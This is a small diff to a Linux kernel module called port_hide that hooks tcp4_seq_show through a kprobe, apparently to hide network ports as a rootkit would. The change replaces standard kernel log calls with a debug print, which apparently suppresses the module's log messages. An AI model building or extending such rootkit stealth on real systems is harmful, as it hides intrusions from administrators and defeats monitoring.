@@ -95,7 +95,7 @@ static int __init port_hide_init(void)
 
 	ret = register_kprobe(&kp);
 	if (ret < 0) {
-		pr_err("register_kprobe failed, returned %d\n", ret);
+		dbg_print("register_kprobe failed, returned %d\n", ret);
 		return ret;
 	}
 	dbg_print("tcp4_seq_show: %px\n", kp.addr);
@@ -105,7 +105,7 @@ static int __init port_hide_init(void)
 static void __exit port_hide_exit(void)
 {
 	unregister_kprobe(&kp);
-	pr_info("port_hide exit successfully\n");
+	dbg_print("port_hide exit successfully\n");
 }
 
 module_init(port_hide_init);
